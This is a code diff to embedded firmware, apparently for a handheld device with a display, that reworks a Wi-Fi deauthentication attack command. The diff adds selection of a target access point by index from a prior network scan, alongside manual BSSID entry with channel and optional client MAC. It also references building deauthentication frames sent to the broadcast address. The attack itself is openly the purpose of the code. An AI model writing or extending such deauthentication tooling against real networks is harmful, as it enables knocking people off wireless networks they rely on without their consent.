@@ -5,8 +5,8 @@ extern InputHandling inputHandler;
 
 static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-DeauthAttack::DeauthAttack(DisplayManager& displayManager)
-    : displayManager(displayManager) {}
+DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFunctions)
+    : displayManager(displayManager), wifiFunctions(wifiFunctions) {}
 
 // ── MAC parsing ───────────────────────────────────────────────────────────────
 bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
@@ -42,41 +42,75 @@ void DeauthAttack::buildDeauthFrame(uint8_t* f, const uint8_t* da, const uint8_t
 }
 
 // ── argument parser ───────────────────────────────────────────────────────────
-// Usage: deauth <bssid> [channel=6] [client_mac]
+// Usage: deauth <index>          — uses scan result by index (run scanwifi first)
+//        deauth <bssid> [ch] [client_mac]  — manual BSSID entry
 void DeauthAttack::start(char* args) {
     if (!args || !*args) {
         displayManager.setCursor(10, displayManager.getCursorY());
-        displayManager.println("Usage: deauth <bssid> [channel] [client]");
-        displayManager.println("  bssid   : target AP  XX:XX:XX:XX:XX:XX");
-        displayManager.println("  channel : 1-13 (default 6)");
-        displayManager.println("  client  : specific client MAC (optional)");
+        displayManager.println("Usage:");
+        displayManager.setCursor(10, displayManager.getCursorY());
+        displayManager.println("  deauth <index>           (after scanwifi)");
+        displayManager.setCursor(10, displayManager.getCursorY());
+        displayManager.println("  deauth <bssid> [ch] [client]");
         displayManager.printCommandScreen();
         return;
     }
 
-    // tokenise args in place
     char buf[128];
     strncpy(buf, args, sizeof(buf) - 1);
     buf[sizeof(buf) - 1] = '\0';
 
-    char* bssidStr   = strtok(buf,     " ");
+    char* first      = strtok(buf,     " ");
     char* channelStr = strtok(nullptr, " ");
     char* clientStr  = strtok(nullptr, " ");
 
     uint8_t bssid[6];
-    if (!parseMac(bssidStr, bssid)) {
+    int     channel = 6;
+
+    // ── index mode: no colon in first arg → treat as scan index ──────────────
+    if (strchr(first, ':') == nullptr) {
+        int idx = atoi(first);
+
+        if (!wifiFunctions.isScanDone()) {
+            displayManager.setCursor(10, displayManager.getCursorY());
+            displayManager.println("Run scanwifi first.");
+            displayManager.printCommandScreen();
+            return;
+        }
+        if (!wifiFunctions.getNetworkInfo(idx, bssid, &channel)) {
+            displayManager.setCursor(10, displayManager.getCursorY());
+            displayManager.printText("Invalid index. Networks found: ");
+            displayManager.println(wifiFunctions.getNetworkCount());
+            displayManager.printCommandScreen();
+            return;
+        }
+
+        // show what we resolved
         displayManager.setCursor(10, displayManager.getCursorY());
-        displayManager.println("Invalid BSSID. Format: XX:XX:XX:XX:XX:XX");
-        displayManager.printCommandScreen();
-        return;
+        displayManager.printText("Target [");
+        displayManager.printText(idx);
+        displayManager.printText("]: ");
+        displayManager.println(macStr(bssid).c_str());
+        displayManager.setCursor(10, displayManager.getCursorY());
+        displayManager.printText("Channel: ");
+        displayManager.println(channel);
+        delay(800);
+
+    // ── BSSID mode: has colons → parse as MAC ─────────────────────────────────
+    } else {
+        if (!parseMac(first, bssid)) {
+            displayManager.setCursor(10, displayManager.getCursorY());
+            displayManager.println("Invalid BSSID. Format: XX:XX:XX:XX:XX:XX");
+            displayManager.printCommandScreen();
+            return;
+        }
+        if (channelStr) {
+            int ch = atoi(channelStr);
+            if (ch >= 1 && ch <= 13) channel = ch;
+        }
     }
 
-    int channel = 6;
-    if (channelStr) {
-        int ch = atoi(channelStr);
-        if (ch >= 1 && ch <= 13) channel = ch;
-    }
-
+    // ── optional directed client MAC ──────────────────────────────────────────
     uint8_t clientMac[6];
     bool directed = false;
     if (clientStr && strlen(clientStr) == 17) {
